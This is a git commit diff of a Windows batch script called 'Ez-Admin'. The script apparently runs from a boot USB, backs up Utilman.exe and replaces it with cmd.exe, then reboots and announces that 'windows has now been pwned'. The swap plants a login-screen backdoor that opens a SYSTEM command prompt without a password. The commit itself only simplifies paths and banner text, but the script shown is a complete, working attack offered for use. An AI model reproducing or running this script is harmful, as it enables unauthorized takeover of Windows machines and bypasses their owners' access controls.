bff40396dd3c86fde5d188d277b7ddab89de8545
rainestorme <115757568+rainestorme@users.noreply.github.com>
2022-10-13 20:53:58 -0500

    Fixed errors with files not found

--- ez-admin.bat
+++ ez-admin.bat
@@ -3,25 +3,24 @@ cls
 @echo off
 color D
 title -- Ez-Admin - Made by rainestorme --
-echo                .----------------------.
-echo                | Welcome to Ez-Admin! |
-echo                '----------------------'
+echo                ------------------------
+echo                  Welcome to Ez-Admin! 
+echo                ------------------------
 echo.
 echo           Stage 1: Backing up Utilman.exe...
 echo.
 C:
-cd Windows
-cd System32
-copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.bak
+cd C:\Windows\System32
+copy Utilman.exe Utilman-ez.bak
 timeout /t 3
 echo.
 echo        Stage 2: Copying cmd.exe to Utilman.exe...
-xcopy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+xcopy cmd.exe Utilman.exe
 echo.
 timeout /t 3
 cls
 echo            --- windows has now been pwned ---
-echo          --- the system will now shut down. ---
+echo          --- the system will shut down soon ---
 echo --- when the screen goes black, remove the usb drive ---
 timeout /t 10
 wpeutil reboot
